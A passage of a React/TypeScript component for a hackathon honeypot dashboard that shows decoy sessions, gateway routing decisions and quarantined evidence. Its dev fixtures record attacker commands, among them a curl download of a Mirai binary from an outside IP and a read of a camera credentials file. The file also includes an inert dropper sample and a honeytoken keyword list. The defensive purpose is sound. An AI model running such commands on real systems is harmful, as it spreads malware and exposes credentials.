import React, { useState, useEffect, useCallback, useRef } from 'react'
import './decoy.css'

// =============================================================================
// TypeScript Interfaces & Types
// =============================================================================

export interface GatewayDecisionInfo {
  destination: 'real' | 'rate_limit' | 'decoy' | string
  score: number
  reason: string
}

export interface FileSubmissionInfo {
  submission_id: string
  received_at: number
  original_filename: string
  quarantine_filename: string
  size_bytes: number
  sha256: string
  md5: string
  candidate_urls: string[]
  candidate_ips: string[]
}

export interface DecoySessionItem {
  session_id: string
  source_ip: string
  service: string
  failed_logins: number
  commands: string[]
  honeytoken_hit: boolean
  malware_hash?: string | null
  c2_address?: string | null
  created_at?: number
  last_active?: number
  gateway_decision?: GatewayDecisionInfo | null
  file_submissions?: FileSubmissionInfo[]
  referenced_urls?: string[]
  referenced_files?: string[]
}

export interface RouteDecisionItem {
  source_ip: string
  destination: string
  score: number
  reason: string
}

export interface OperatorTelemetryPayload {
  status: string
  timestamp: number
  operator_mode: string
  sessions_count: number
  sessions: DecoySessionItem[]
  gateway_summary?: {
    tracked_sources: number
    destinations: { real: number; rate_limit: number; decoy: number }
    allowlist_count?: number
    recent_decisions?: RouteDecisionItem[]
  }
  epistemic_disclaimer?: string
}

// Configurable API base (Vite environment variable or default local backend)
const API_BASE =
  (typeof import.meta !== 'undefined' && (import.meta.env?.VITE_API_URL as string)) ||
  (typeof import.meta !== 'undefined' && (import.meta.env?.VITE_API_BASE_URL as string)) ||
  'http://localhost:8000'

// =============================================================================
// Explicit Development Seed Fixtures (Restricted to Offline Development/Demo)
// =============================================================================

const DEV_SEED_SESSIONS: DecoySessionItem[] = [
  {
    session_id: 'sess-alpha-71',
    source_ip: '194.26.29.112',
    service: 'ssh',
    failed_logins: 3,
    commands: [
      'uname -a',
      'ls /etc/camera',
      'curl http://185.220.101.5:8080/mirai.arm7 -o /tmp/bot',
      'cat /etc/camera/credentials.conf',
    ],
    honeytoken_hit: true,
    malware_hash: 'c920fa9ab073c684dd50e39128ec1e48f719505dde3b2f0c854adada291e40c4',
    c2_address: 'http://185.220.101.5:8080/mirai.arm7',
    created_at: Date.now() / 1000 - 300,
    last_active: Date.now() / 1000 - 15,
    gateway_decision: {
      destination: 'decoy',
      score: 65.0,
      reason: 'Hostile threshold crossed: IoT default credential attempted (root:123456)',
    },
    file_submissions: [
      {
        submission_id: 'sub-demo-01',
        received_at: Date.now() / 1000 - 30,
        original_filename: 'dropper.sh',
        quarantine_filename: 'artifact_c920fa9ab073c684_demo.bin',
        size_bytes: 94,
        sha256: 'c920fa9ab073c684dd50e39128ec1e48f719505dde3b2f0c854adada291e40c4',
        md5: 'd41d8cd98f00b204e9800998ecf8427e',
        candidate_urls: ['http://185.220.101.5:8080/mirai.arm7'],
        candidate_ips: ['185.220.101.5:8080'],
      },
    ],
    referenced_urls: ['http://185.220.101.5:8080/mirai.arm7'],
    referenced_files: ['/tmp/bot'],
  },
  {
    session_id: 'sess-beta-19',
    source_ip: '203.0.113.88',
    service: 'web',
    failed_logins: 2,
    commands: ['GET /api/decoy/web/login', 'POST /api/decoy/web/login (admin:admin)'],
    honeytoken_hit: false,
    malware_hash: null,
    c2_address: null,
    created_at: Date.now() / 1000 - 600,
    last_active: Date.now() / 1000 - 120,
    gateway_decision: {
      destination: 'decoy',
      score: 65.0,
      reason: 'Hostile threshold crossed: Default camera credentials attempted (admin:admin)',
    },
    file_submissions: [],
    referenced_urls: [],
    referenced_files: [],
  },
  {
    session_id: 'sess-gamma-42',
    source_ip: '198.51.100.20',
    service: 'ssh',
    failed_logins: 1,
    commands: ['pwd', 'whoami', 'cat /proc/version'],
    honeytoken_hit: false,
    malware_hash: null,
    c2_address: null,
    created_at: Date.now() / 1000 - 900,
    last_active: Date.now() / 1000 - 450,
    gateway_decision: {
      destination: 'rate_limit',
      score: 30.0,
      reason: 'Fail-safe rate limit applied: Multi-service probe (web, ssh)',
    },
    file_submissions: [],
    referenced_urls: [],
    referenced_files: [],
  },
]

const DEV_SEED_ROUTES: RouteDecisionItem[] = [
  {
    source_ip: '127.0.0.1',
    destination: 'real',
    score: 0.0,
    reason: 'Trusted source IP in gateway allowlist (requires real auth)',
  },
  {
    source_ip: '198.51.100.20',
    destination: 'rate_limit',
    score: 30.0,
    reason: 'Fail-safe rate limit applied: Multi-service probe (web, ssh)',
  },
  {
    source_ip: '194.26.29.112',
    destination: 'decoy',
    score: 65.0,
    reason: 'Hostile threshold crossed: IoT default credential attempted (root:123456)',
  },
  {
    source_ip: '203.0.113.88',
    destination: 'decoy',
    score: 65.0,
    reason: 'Hostile threshold crossed: IoT default credential attempted (admin:admin)',
  },
]

// =============================================================================
// DecoyPage Component
// =============================================================================

export const DecoyPage: React.FC = () => {
  // Data State
  const [sessions, setSessions] = useState<DecoySessionItem[]>([])
  const [routes, setRoutes] = useState<RouteDecisionItem[]>([])
  const [selectedSessionId, setSelectedSessionId] = useState<string>('')
  const [activeTab, setActiveTab] = useState<'sessions' | 'routes'>('sessions')

  // Connection & Lifecycle State
  const [connectionStatus, setConnectionStatus] = useState<'loading' | 'connected' | 'error' | 'fixture'>('loading')
  const [errorMessage, setErrorMessage] = useState<string>('')
  const [lastUpdated, setLastUpdated] = useState<string>('')
  const [autoRefresh, setAutoRefresh] = useState<boolean>(true)
  const [isRefreshing, setIsRefreshing] = useState<boolean>(false)

  // Simulation & Keystroke Input State
  const [customCmd, setCustomCmd] = useState<string>('')
  const [simNotice, setSimNotice] = useState<string>('')
  const [isSimulatingBenign, setIsSimulatingBenign] = useState<boolean>(false)
  const [isSimulatingScanner, setIsSimulatingScanner] = useState<boolean>(false)
  const [isUploadingEvidence, setIsUploadingEvidence] = useState<boolean>(false)
  const [drillNotice, setDrillNotice] = useState<string>('')
  const fileInputRef = useRef<HTMLInputElement>(null)

  // ---------------------------------------------------------------------------
  // Backend Polling & Fetch Logic
  // ---------------------------------------------------------------------------

  const fetchTelemetry = useCallback(async (isManual: boolean = false) => {
    if (isManual) setIsRefreshing(true)
    try {
      const res = await fetch(`${API_BASE}/api/decoy/operator/telemetry`, {
        headers: {
          'X-Operator-Token': 'dev-operator-token-2026',
        },
      })

      if (!res.ok) {
        throw new Error(`HTTP ${res.status}: ${res.statusText}`)
      }

      const data: OperatorTelemetryPayload = await res.json()
      setSessions(data.sessions || [])
      if (data.gateway_summary?.recent_decisions) {
        setRoutes(data.gateway_summary.recent_decisions)
      }

      // Preserve selection or default to first session
      if (data.sessions && data.sessions.length > 0) {
        setSelectedSessionId((prev) => (data.sessions.some((s) => s.session_id === prev) ? prev : data.sessions[0].session_id))
      }

      setConnectionStatus('connected')
      setErrorMessage('')
      setLastUpdated(new Date().toLocaleTimeString())
    } catch (err: any) {
      // If backend is unreachable and we have no data, note error
      if (connectionStatus !== 'fixture') {
        setErrorMessage(err.message || 'Failed to fetch telemetry from operator backend.')
        setConnectionStatus('error')
      }
    } finally {
      if (isManual) setIsRefreshing(false)
    }
  }, [connectionStatus])

  // Periodic polling hook (every 3 seconds)
  useEffect(() => {
    let isMounted = true

    const poll = async () => {
      try {
        const res = await fetch(`${API_BASE}/api/decoy/operator/telemetry`, {
          headers: {
            'X-Operator-Token': 'dev-operator-token-2026',
          },
        })
        if (!res.ok) throw new Error(`HTTP ${res.status}: ${res.statusText}`)
        const data: OperatorTelemetryPayload = await res.json()
        if (!isMounted) return
        setSessions(data.sessions || [])
        if (data.gateway_summary?.recent_decisions) {
          setRoutes(data.gateway_summary.recent_decisions)
        }
        if (data.sessions && data.sessions.length > 0) {
          setSelectedSessionId((prev) =>
            data.sessions.some((s) => s.session_id === prev) ? prev : data.sessions[0].session_id
          )
        }
        setConnectionStatus('connected')
        setErrorMessage('')
        setLastUpdated(new Date().toLocaleTimeString())
      } catch (err: any) {
        if (!isMounted) return
        setErrorMessage((prev) => (prev ? prev : err.message || 'Failed to fetch telemetry from operator backend.'))
        setConnectionStatus((prev) => (prev === 'fixture' ? 'fixture' : 'error'))
      }
    }

    poll()

    if (!autoRefresh) {
      return () => {
        isMounted = false
      }
    }

    const interval = setInterval(poll, 3000)

    return () => {
      isMounted = false
      clearInterval(interval)
    }
  }, [autoRefresh])

  // Explicit Fallback to Dev Seed Fixture
  const loadDevFixture = () => {
    setSessions(DEV_SEED_SESSIONS)
    setRoutes(DEV_SEED_ROUTES)
    setSelectedSessionId(DEV_SEED_SESSIONS[0].session_id)
    setConnectionStatus('fixture')
    setErrorMessage('')
    setLastUpdated(new Date().toLocaleTimeString() + ' (Dev Fixture)')
  }

  // Currently Selected Session
  const selectedSession = sessions.find((s) => s.session_id === selectedSessionId) || sessions[0]

  // Count Aggregates
  const totalHoneytokenHits = sessions.filter((s) => s.honeytoken_hit).length
  const totalIOCs = sessions.filter((s) => s.malware_hash || s.c2_address).length
  const decoyRouteCount = routes.filter((r) => r.destination === 'decoy').length
  const rateLimitCount = routes.filter((r) => r.destination === 'rate_limit').length
  const realCount = routes.filter((r) => r.destination === 'real').length

  // ---------------------------------------------------------------------------
  // Interactive Simulation & Injection Handlers
  // ---------------------------------------------------------------------------

  const handleRunCommand = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!customCmd.trim() || !selectedSession) return

    const trimmed = customCmd.trim()
    setCustomCmd('')

    if (connectionStatus === 'connected') {
      try {
        const res = await fetch(`${API_BASE}/api/decoy/simulate/command`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            session_id: selectedSession.session_id,
            command: trimmed,
            source_ip: selectedSession.source_ip,
          }),
        })
        if (res.ok) {
          await fetchTelemetry()
          setSimNotice(`Command executed on backend sandbox: "${trimmed}"`)
          setTimeout(() => setSimNotice(''), 4000)
          return
        }
      } catch {
        // Fall back to local update if backend request failed
      }
    }

    // Local / Fixture State Update
    const isHoneytoken =
      trimmed.includes('credentials.conf') ||
      trimmed.includes('emergency_token.cfg') ||
      trimmed.includes('vault_token.key') ||
      trimmed.includes('firmware_pass.enc') ||
      trimmed.includes('.aws_keys')

    let extractedHash: string | null = null
    let extractedC2: string | null = null
    const urlMatch = trimmed.match(/(https?:\/\/[^\s]+)/)
    if (urlMatch) extractedC2 = urlMatch[1]
    const hashMatch = trimmed.match(/\b[a-f0-9]{32,64}\b/i)
    if (hashMatch) extractedHash = hashMatch[0]

    const updatedSession: DecoySessionItem = {
      ...selectedSession,
      commands: [...selectedSession.commands, trimmed],
      honeytoken_hit: selectedSession.honeytoken_hit || isHoneytoken,
      malware_hash: extractedHash || selectedSession.malware_hash,
      c2_address: extractedC2 || selectedSession.c2_address,
      last_active: Date.now() / 1000,
    }

    setSessions((prev) => prev.map((s) => (s.session_id === selectedSession.session_id ? updatedSession : s)))
    setSimNotice(`Simulated command appended: "${trimmed}"`)
    setTimeout(() => setSimNotice(''), 4000)
  }

  // ---------------------------------------------------------------------------
  // Hackathon Simulation Drills (Member B Sandbox) Handlers
  // ---------------------------------------------------------------------------

  const handleSimulateBenignAdmin = async () => {
    setIsSimulatingBenign(true)
    const adminIp = '10.0.0.50'
    try {
      const res = await fetch(`${API_BASE}/api/gateway/route`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          source_ip: adminIp,
          service: 'ssh',
          username: 'field_technician',
          password: 'ValidTechnicianKey2026!',
          is_login_failure: false,
        }),
      })

      if (res.ok) {
        const decision: RouteDecisionItem = await res.json()
        await fetchTelemetry()
        setActiveTab('routes')
        const msg = `✅ Benign Admin Drill: IP ${decision.source_ip} evaluated by Gateway -> Destination: "${decision.destination.toUpperCase()}" (Score: ${decision.score.toFixed(1)}). Switched to Route Decisions table.`
        setDrillNotice(msg)
        setSimNotice(msg)
        setTimeout(() => setDrillNotice(''), 7000)
        return
      }
    } catch (err) {
      console.warn('Backend route simulation error:', err)
    } finally {
      setIsSimulatingBenign(false)
    }

    // Fallback if offline
    const fallbackRoute: RouteDecisionItem = {
      source_ip: adminIp,
      destination: 'real',
      score: 0.0,
      reason: 'Trusted operator IP in gateway allowlist (routes to real device; requires valid auth)',
    }
    setRoutes((prev) => [fallbackRoute, ...prev.filter((r) => r.source_ip !== adminIp)])
    setActiveTab('routes')
    const fallbackMsg = `✅ Benign Admin Drill (Offline): IP ${adminIp} routed to Real Camera (Score: 0.0).`
    setDrillNotice(fallbackMsg)
    setSimNotice(fallbackMsg)
    setTimeout(() => setDrillNotice(''), 7000)
  }

  const handleSimulatePortScanner = async () => {
    setIsSimulatingScanner(true)
    const scannerIp = `198.51.100.${Math.floor(Math.random() * 80 + 10)}`
    try {
      // 1. First probe on web port (touch service 1)
      await fetch(`${API_BASE}/api/gateway/route`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          source_ip: scannerIp,
          service: 'web',
        }),
      })

      // 2. Rapid second probe on SSH port with failed login (touch service 2 + failed login) -> score 30.0 -> rate_limit!
      const res = await fetch(`${API_BASE}/api/gateway/route`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          source_ip: scannerIp,
          service: 'ssh',
          is_login_failure: true,
        }),
      })

      if (res.ok) {
        const decision: RouteDecisionItem = await res.json()
        await fetchTelemetry()
        setActiveTab('routes')
        const msg = `⚠️ Port Scanner Drill: Recon probe from ${decision.source_ip} detected -> Escalated to "${decision.destination.toUpperCase()}" Throttling (Score: ${decision.score.toFixed(1)}). Switched to Route Decisions table.`
        setDrillNotice(msg)
        setSimNotice(msg)
        setTimeout(() => setDrillNotice(''), 7000)
        return
      }
    } catch (err) {
      console.warn('Backend port scanner simulation error:', err)
    } finally {
      setIsSimulatingScanner(false)
    }

    // Fallback if offline
    const fallbackRoute: RouteDecisionItem = {
      source_ip: scannerIp,
      destination: 'rate_limit',
      score: 30.0,
      reason: 'Uncertain reconnaissance: Distinct services touched: ssh, web, Failed login attempt #1',
    }
    setRoutes((prev) => [fallbackRoute, ...prev])
    setActiveTab('routes')
    const fallbackMsg = `⚠️ Port Scanner Drill (Offline): IP ${scannerIp} throttled to Rate-Limit (Score: 30.0).`
    setDrillNotice(fallbackMsg)
    setSimNotice(fallbackMsg)
    setTimeout(() => setDrillNotice(''), 7000)
  }

  const handleSimulateEvidenceUpload = async () => {
    setIsUploadingEvidence(true)
    const targetSessionId = selectedSession?.session_id || (sessions.length > 0 ? sessions[0].session_id : 'sess-ssh-seed-01')
    const samplePayload = `#!/bin/sh\n# MIRAI DROPPER STAGE2\nC2=http://198.51.100.99:9000/stage2\nIP=203.0.113.44:443\nGATEWAY_CHECK=http://mirai-telemetry.example.org:8080/checkin\nexit 0\n`

    try {
      const res = await fetch(`${API_BASE}/api/decoy/upload?session_id=${encodeURIComponent(targetSessionId)}&filename=mirai_dropper.sh`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/octet-stream',
        },
        body: samplePayload,
      })

      if (res.ok) {
        const data = await res.json()
        await fetchTelemetry()
        setSelectedSessionId(targetSessionId)
        setActiveTab('sessions')
        const msg = `📁 Demo File Quarantined: "${data.original_filename}" stored as ${data.quarantine_filename} (SHA-256: ${data.sha256.slice(0, 16)}..., IOC URLs: ${data.candidate_urls.length}) in session ${targetSessionId}.`
        setDrillNotice(msg)
        setSimNotice(msg)
        setTimeout(() => setDrillNotice(''), 7000)

        // Smooth scroll to the evidence card in the right column
        setTimeout(() => {
          const el = document.getElementById('session-evidence-panel')
          if (el) {
            el.scrollIntoView({ behavior: 'smooth', block: 'nearest' })
          }
        }, 100)
        return
      }
    } catch (err) {
      console.warn('Backend evidence upload error:', err)
    } finally {
      setIsUploadingEvidence(false)
    }

    // Fallback if offline
    const newSubmission: FileSubmissionInfo = {
      submission_id: `sub-${Math.floor(Math.random() * 900000 + 100000)}`,
      received_at: Date.now() / 1000,
      original_filename: 'mirai_dropper.sh',
      quarantine_filename: `artifact_demo_${Math.floor(Math.random() * 9000 + 1000)}.bin`,
      size_bytes: samplePayload.length,
      sha256: 'c920fa9ab073c684dd50e39128ec1e48f719505dde3b2f0c854adada291e40c4',
      md5: 'd41d8cd98f00b204e9800998ecf8427e',
      candidate_urls: ['http://198.51.100.99:9000/stage2', 'http://mirai-telemetry.example.org:8080/checkin'],
      candidate_ips: ['203.0.113.44:443'],
    }

    if (selectedSession) {
      const updatedSession: DecoySessionItem = {
        ...selectedSession,
        file_submissions: [...(selectedSession.file_submissions || []), newSubmission],
        malware_hash: newSubmission.sha256,
        c2_address: newSubmission.candidate_urls[0],
        last_active: Date.now() / 1000,
      }
      setSessions((prev) => prev.map((s) => (s.session_id === selectedSession.session_id ? updatedSession : s)))
    }
    setActiveTab('sessions')
    const fallbackMsg = `📁 File Quarantined (Offline): "mirai_dropper.sh" added to session evidence.`
    setDrillNotice(fallbackMsg)
    setSimNotice(fallbackMsg)
    setTimeout(() => setDrillNotice(''), 7000)
  }

  const handleCustomFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return

    setIsUploadingEvidence(true)
    const targetSessionId = selectedSession?.session_id || (sessions.length > 0 ? sessions[0].session_id : 'sess-ssh-seed-01')

    try {
      const arrayBuffer = await file.arrayBuffer()
      const res = await fetch(
        `${API_BASE}/api/decoy/upload?session_id=${encodeURIComponent(targetSessionId)}&filename=${encodeURIComponent(file.name)}`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/octet-stream' },
          body: arrayBuffer,
        }
      )

      if (res.ok) {
        const data = await res.json()
        await fetchTelemetry()
        setSelectedSessionId(targetSessionId)
        setActiveTab('sessions')
        const msg = `📁 Quarantined "${file.name}" (${file.size} B) -> Saved as ${data.quarantine_filename} (SHA-256: ${data.sha256.slice(0, 16)}...)`
        setDrillNotice(msg)
        setSimNotice(msg)
        setTimeout(() => setDrillNotice(''), 7000)

        setTimeout(() => {
          const el = document.getElementById('session-evidence-panel')
          if (el) {
            el.scrollIntoView({ behavior: 'smooth', block: 'nearest' })
          }
        }, 100)
        return
      } else {
        const errJson = await res.json().catch(() => ({}))
        const errMsg = `Upload error: ${errJson.detail || res.statusText}`
        setDrillNotice(errMsg)
        setTimeout(() => setDrillNotice(''), 7000)
      }
    } catch (err: any) {
      const errMsg = `Upload failed: ${err.message}`
      setDrillNotice(errMsg)
      setTimeout(() => setDrillNotice(''), 7000)
    } finally {
      setIsUploadingEvidence(false)
      if (fileInputRef.current) fileInputRef.current.value = ''
    }
  }

  // ---------------------------------------------------------------------------
  // Render Helpers
  // ---------------------------------------------------------------------------

  const renderServiceBadge = (service: string) => {
    const s = service.toLowerCase()
    let color = '#38bdf8'
    let bg = 'rgba(56, 189, 248, 0.12)'
    if (s === 'ssh') {
      color = '#a78bfa'
      bg = 'rgba(167, 139, 250, 0.12)'
    } else if (s === 'web') {
      color = '#38bdf8'
      bg = 'rgba(56, 189, 248, 0.12)'
    } else if (s === 'mqtt') {
      color = '#34d399'
      bg = 'rgba(52, 211, 153, 0.12)'
    }
    return (
      <span className="badge-pill" style={{ color, background: bg, borderColor: color + '40' }}>
        {service.toUpperCase()}
      </span>
    )
  }

  const renderDestinationBadge = (dest?: string) => {
    if (!dest) return <span style={{ color: 'var(--text-muted)' }}>—</span>
    if (dest === 'decoy') return <span className="badge-pill badge-decoy">DECOY</span>
    if (dest === 'rate_limit') return <span className="badge-pill badge-ratelimit">RATE-LIMIT</span>
    if (dest === 'real') return <span className="badge-pill badge-real">REAL</span>
    return <span className="badge-pill">{dest.toUpperCase()}</span>
  }

  return (
    <div className="page-container" id="page-decoy">
      {/* Page Header */}
      <div className="page-header">
        <div className="badge owner-badge">Owner: Member B — Stage 2 (Phantom Twin & Gateway)</div>
        <h1 id="heading-decoy">Decoy Activity & Gateway</h1>
        <p className="page-desc">
          Perimeter connection routing, in-memory IoT honeypot sandbox, multi-depth canary honeytokens, and
          static file evidence collection.
        </p>
      </div>

      {/* Connection & Live Polling Status Bar */}
      <div className="connection-bar">
        <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', flexWrap: 'wrap' }}>
          {connectionStatus === 'connected' && (
            <span className="connection-pill connected">
              <span className="status-dot green"></span>
              Live Backend Connected ({API_BASE})
            </span>
          )}
          {connectionStatus === 'loading' && (
            <span className="connection-pill loading">
              <span className="status-dot blue"></span>
              Connecting to backend at {API_BASE}...
            </span>
          )}
          {connectionStatus === 'error' && (
            <span className="connection-pill error">
              <span className="status-dot red"></span>
              Backend Offline ({errorMessage || 'Failed to fetch'})
            </span>
          )}
          {connectionStatus === 'fixture' && (
            <span className="connection-pill fixture">
              <span className="status-dot amber"></span>
              Dev Fixture Mode (Offline Simulation)
            </span>
          )}

          {lastUpdated && (
            <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
              Last sync: {lastUpdated}
            </span>
          )}
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem' }}>
          {connectionStatus === 'error' && (
            <button className="btn-sim" onClick={loadDevFixture}>
              Load Dev Fixture (Offline)
            </button>
          )}

          <button
            className="btn-sim"
            onClick={() => setAutoRefresh(!autoRefresh)}
            title="Toggle background polling every 3 seconds"
          >
            Auto-polling: {autoRefresh ? 'ON' : 'OFF'}
          </button>

          <button
            className="btn-sim"
            onClick={() => fetchTelemetry(true)}
            disabled={isRefreshing}
            style={{ display: 'flex', alignItems: 'center', gap: '0.35rem' }}
          >
            <span>🔄</span>
            <span>{isRefreshing ? 'Refreshing...' : 'Refresh'}</span>
          </button>
        </div>
      </div>

      {/* Explicit Dev Fixture Notice Banner */}
      {connectionStatus === 'fixture' && (
        <div className="fixture-banner">
          <div>
            <strong>[OFFLINE DEV FIXTURE ACTIVE]</strong> Displaying synthetic seed state for local UI preview.
            Real backend data is not connected. Start <code>dev_harness.py</code> or <code>main.py</code> on port 8000
            and click Refresh to switch to live telemetry.
          </div>
          <button className="btn-sim" onClick={() => fetchTelemetry(true)}>
            Connect Live
          </button>
        </div>
      )}

      {/* Honeytoken Threat Alert Banner */}
      {totalHoneytokenHits > 0 && (
        <div className="honeytoken-banner">
          <div className="banner-left">
            <div className="banner-icon">⚠️</div>
            <div>
              <div className="banner-title">Canary Honeytoken Access Observed (High Hostility)</div>
              <div className="banner-desc">
                Attacker accessed bait file within virtual filesystem. Sandboxed Rickroll reverse payload returned.
                Observed bait interaction; does not establish human identity or legal guilt.
              </div>
            </div>
          </div>
          <span className="badge-pill badge-trap">TRAP ACTIVE ({totalHoneytokenHits})</span>
        </div>
      )}

      {/* Simulation Feedback Notice */}
      {simNotice && (
        <div
          style={{
            background: 'rgba(56, 189, 248, 0.1)',
            border: '1px solid var(--accent-cyan)',
            borderRadius: 'var(--radius-sm)',
            padding: '0.5rem 0.85rem',
            marginBottom: '1rem',
            fontSize: '0.8rem',
            color: 'var(--accent-cyan)',
          }}
        >
          {simNotice}
        </div>
      )}

      {/* Metrics Row */}
      <div className="decoy-grid">
        <div className="stat-card">
          <div className="stat-header">
            <span className="stat-label">Active Decoy Sessions</span>
            <span className="stat-icon" style={{ background: 'rgba(56, 189, 248, 0.15)', color: '#38bdf8' }}>
              📡
            </span>
          </div>
          <div className="stat-val">{sessions.length}</div>
          <div className="stat-sub">
            <span className="status-indicator-dot" style={{ background: '#38bdf8' }}></span>
            <span>Virtual sandbox nodes ({realCount} safe to real)</span>
          </div>
        </div>

        <div className="stat-card">
          <div className="stat-header">
            <span className="stat-label">Trapped in Decoy</span>
            <span className="stat-icon" style={{ background: 'rgba(244, 63, 94, 0.15)', color: '#f43f5e' }}>
              🎯
            </span>
          </div>
          <div className="stat-val">{decoyRouteCount}</div>
          <div className="stat-sub">
            <span className="status-indicator-dot" style={{ background: '#f43f5e' }}></span>
            <span>Hostile connections locked</span>
          </div>
        </div>

        <div className="stat-card">
          <div className="stat-header">
            <span className="stat-label">Fail-Safe Throttled</span>
            <span className="stat-icon" style={{ background: 'rgba(245, 158, 11, 0.15)', color: '#f59e0b' }}>
              ⏳
            </span>
          </div>
          <div className="stat-val">{rateLimitCount}</div>
          <div className="stat-sub">
            <span className="status-indicator-dot" style={{ background: '#f59e0b' }}></span>
            <span>Reconnaissance rate-limited</span>
          </div>
        </div>

        <div className="stat-card">
          <div className="stat-header">
            <span className="stat-label">Extracted Evidence IOCs</span>
            <span className="stat-icon" style={{ background: 'rgba(99, 102, 241, 0.15)', color: '#6366f1' }}>
              🔍
            </span>
          </div>
          <div className="stat-val">{totalIOCs}</div>
          <div className="stat-sub">
            <span className="status-indicator-dot" style={{ background: '#6366f1' }}></span>
            <span>Candidate digests & C2s</span>
          </div>
        </div>
      </div>

      {/* Initial Loading Skeleton */}
      {connectionStatus === 'loading' && sessions.length === 0 && (
        <div className="panel-card" style={{ padding: '2rem' }}>
          <div style={{ color: 'var(--text-muted)', marginBottom: '1rem', fontSize: '0.85rem' }}>
            Querying Person B operator API at {API_BASE}...
          </div>
          <div className="skeleton-row"></div>
          <div className="skeleton-row"></div>
          <div className="skeleton-row"></div>
        </div>
      )}

      {/* Backend Unreachable Error Card */}
      {connectionStatus === 'error' && sessions.length === 0 && (
        <div className="state-card">
          <div className="state-icon">🔌</div>
          <div className="state-title">Unable to Connect to Operator API</div>
          <div className="state-desc">
            Failed to connect to Person B backend at <code>{API_BASE}</code>. Make sure{' '}
            <code>python dev_harness.py</code> or <code>python main.py</code> is running. You can click Retry to
            attempt reconnecting or load the offline simulation fixture.
          </div>
          <div style={{ display: 'flex', gap: '0.75rem' }}>
            <button className="btn-sim" onClick={() => fetchTelemetry(true)}>
              🔄 Retry Connection
            </button>
            <button className="btn-sim btn-sim-danger" onClick={loadDevFixture}>
              📁 Load Seed Fixture (Offline)
            </button>
          </div>
        </div>
      )}

      {/* Empty State Card (Connected but no sessions yet) */}
      {connectionStatus === 'connected' && sessions.length === 0 && (
        <div className="state-card">
          <div className="state-icon">🛡️</div>
          <div className="state-title">No Active Decoy Sessions Observed</div>
          <div className="state-desc">
            The honeypot sandbox is armed and running. Incoming SSH probes on port <code>2222</code> or Web authentication
            attempts on <code>/api/decoy/web/login</code> will appear here in real time.
          </div>
          <button className="btn-sim" onClick={loadDevFixture}>
            Load Demo Seed Sessions
          </button>
        </div>
      )}

      {/* Main Two-Column Telemetry Work Area */}
      {sessions.length > 0 && (
        <div className="decoy-sections">
          {/* Left Column: Sessions & Gateway Telemetry */}
          <div className="panel-card">
            <div className="panel-title-bar">
              <div className="panel-title">
                <span>🛡️</span>
                <span>Perimeter Telemetry</span>
              </div>
              <div style={{ display: 'flex', gap: '0.4rem' }}>
                <button
                  className={`btn-sim ${activeTab === 'sessions' ? 'btn-sim-danger' : ''}`}
                  style={activeTab === 'sessions' ? { borderColor: '#38bdf8', color: '#38bdf8' } : {}}
                  onClick={() => setActiveTab('sessions')}
                >
                  Honeypot Sessions ({sessions.length})
                </button>
                <button
                  className={`btn-sim ${activeTab === 'routes' ? 'btn-sim-danger' : ''}`}
                  style={activeTab === 'routes' ? { borderColor: '#38bdf8', color: '#38bdf8' } : {}}
                  onClick={() => setActiveTab('routes')}
                >
                  Route Decisions ({routes.length})
                </button>
              </div>
            </div>

            {activeTab === 'sessions' ? (
              <div className="sessions-table-wrapper">
                <table className="decoy-table">
                  <thead>
                    <tr>
                      <th>Session ID</th>
                      <th>Source IP</th>
                      <th>Service</th>
                      <th>Gateway</th>
                      <th>Logins</th>
                      <th>Honeytoken</th>
                      <th>Evidence / IOC</th>
                    </tr>
                  </thead>
                  <tbody>
                    {sessions.map((sess) => (
                      <tr
                        key={sess.session_id}
                        className={`session-row ${sess.session_id === selectedSession?.session_id ? 'selected' : ''}`}
                        onClick={() => setSelectedSessionId(sess.session_id)}
                      >
                        <td>
                          <code>{sess.session_id}</code>
                        </td>
                        <td>
                          <strong>{sess.source_ip}</strong>
                        </td>
                        <td>{renderServiceBadge(sess.service)}</td>
                        <td>
                          {sess.gateway_decision ? (
                            renderDestinationBadge(sess.gateway_decision.destination)
                          ) : (
                            <span style={{ color: 'var(--text-muted)' }}>—</span>
                          )}
                        </td>
                        <td>{sess.failed_logins} fail</td>
                        <td>
                          {sess.honeytoken_hit ? (
                            <span className="badge-pill badge-trap">TRIPPED</span>
                          ) : (
                            <span style={{ color: 'var(--text-muted)' }}>Armed</span>
                          )}
                        </td>
                        <td>
                          {sess.malware_hash || sess.c2_address ? (
                            <span className="ioc-tag" title={sess.malware_hash || sess.c2_address || ''}>
                              {sess.malware_hash ? sess.malware_hash.slice(0, 8) + '...' : sess.c2_address}
                            </span>
                          ) : (
                            <span style={{ color: 'var(--text-muted)' }}>—</span>
                          )}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            ) : (
              <div className="sessions-table-wrapper">
                <table className="decoy-table">
                  <thead>
                    <tr>
                      <th>Source IP</th>
                      <th>Decision</th>
                      <th>Risk Score</th>
                      <th>Reason</th>
                    </tr>
                  </thead>
                  <tbody>
                    {routes.map((rt, idx) => (
                      <tr key={idx}>
                        <td>
                          <strong>{rt.source_ip}</strong>
                        </td>
                        <td>{renderDestinationBadge(rt.destination)}</td>
                        <td>
                          <code
                            style={{
                              color: rt.score >= 60 ? '#fb7185' : rt.score >= 20 ? '#fbbf24' : '#34d399',
                            }}
                          >
                            {typeof rt.score === 'number' ? rt.score.toFixed(1) : rt.score}
                          </code>
                        </td>
                        <td style={{ fontSize: '0.8rem', color: 'var(--text-secondary)' }}>
                          {rt.reason}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}

            {/* Drill Simulation Controls */}
            <div className="sim-controls">
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '0.4rem' }}>
                <span
                  style={{
                    fontSize: '0.75rem',
                    fontWeight: 600,
                    color: 'var(--text-muted)',
                    textTransform: 'uppercase',
                    letterSpacing: '0.05em',
                  }}
                >
